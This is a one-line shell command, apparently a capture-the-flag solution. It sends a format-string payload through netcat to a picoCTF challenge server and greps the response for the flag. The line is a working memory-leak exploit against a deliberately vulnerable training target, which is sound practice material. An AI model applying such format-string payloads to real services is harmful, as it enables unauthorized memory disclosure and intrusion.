echo '%8$s' | timeout 1 nc 2018shell1.picoctf.com 34802 | grep -o picoCTF{.*}
